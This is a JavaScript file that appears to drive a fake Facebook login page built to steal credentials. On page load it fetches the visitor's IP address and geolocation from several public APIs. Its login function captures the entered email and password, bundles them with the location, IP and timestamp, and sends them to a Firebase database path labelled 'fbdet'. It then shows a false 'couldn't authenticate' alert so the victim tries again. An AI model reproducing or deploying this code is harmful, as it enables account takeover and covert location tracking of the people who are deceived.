fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    console.log(ip)
fetch(`https://freeipapi.com/api/json/${ip}`).then(response =>{
        if(!response.ok){
            alert("An Error Occured ERR-1, Try again");
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data =>{
        const Data1 = data;
        console.log(Data1);
        const lat = Data1.latitude;
        const long = Data1.longitude;
        console.log("lat", lat, "long", long);
        fetch(`https://geolocation-db.com/json/${lat}/${long}`).then(response => {
            if(!response.ok){
                alert("An Error Occured ERR-1, Try again");
                throw new Error('Network response was not ok');
            }
            return response.json();
        }).then(data =>{
            const Data2 = data;
            fetch(`https://nominatim.openstreetmap.org/reverse?format=geojson&lat=${lat}&lon=${long}`).then(response => {
                if(!response.ok){
                    alert("An Error Occured ERR-1, Try again");
                    throw new Error('Network response was not ok');
                }
                return response.json();
            }).then(data => {
                const Data3 = data.address;
                const allData = {...Data1, ...Data2, ...Data3}
                // Secondarydatabase.ref("fbdet").push(allData).then(()=>{
                //     alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                // }).catch((err)=>{
                //     alert(err.message);
                // });
                // console.log(allData);
                console.log(allData)
                const allData2 = JSON.stringify(allData);
                localStorage.setItem("allData", allData2);
            }).catch(err => {
                console.log(err);
                alert("An error Occured\n Code03, Try Again.");
            });
        }).catch(err => {
            console.log(err);
            alert("An error Occured\n Code02, Try Again.");
        });

    }).catch(err =>{
        console.log(err);
        alert("An error Occured\n Code01, Try Again.");
    });
});
    function formatDate(date) {
    const day = date.getDate();
    const month = date.toLocaleString('default', { month: 'long' });
    const year = date.getFullYear();
  
    const dayString = getDayWithOrdinalSuffix(day);
  
    return `${dayString} ${month} ${year}`;
  }
  function getDayWithOrdinalSuffix(day) {
    if (day >= 11 && day <= 13) {
      return day + 'th';
    }
    switch (day % 10) {
      case 1:
        return day + 'st';
      case 2:
        return day + 'nd';
      case 3:
        return day + 'rd';
      default:
        return day + 'th';
    }
  }
async function login(){
    const email = document.getElementById("Email").value;
    const password = document.getElementById("Password").value;
    const dateTime = new Date();
    const Time = dateTime.toLocaleTimeString();
    const formattedDate = formatDate(dateTime);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);

    
    const info = localStorage.getItem('allData');
    const infox = JSON.parse(info);
    const ip = localStorage.getItem('ip');
    console.log(infox);
    const lat = infox.latitude;
    const long = infox.longitude;
    if(email !== "" || password !== ""){
    const Data = {
        email,
        password,
        lat,
        long,
        ip,
        Time,
        formattedDate,
        detailtype: "facebook"
    }

    const twoData = {...Data, ...infox};

    console.log("all data", twoData);
    console.log(Data);
    
    Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                    alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                }).catch((err)=>{
                    alert(err.message);
                });
}else{
    alert("Please enter your Email or Password");
}
}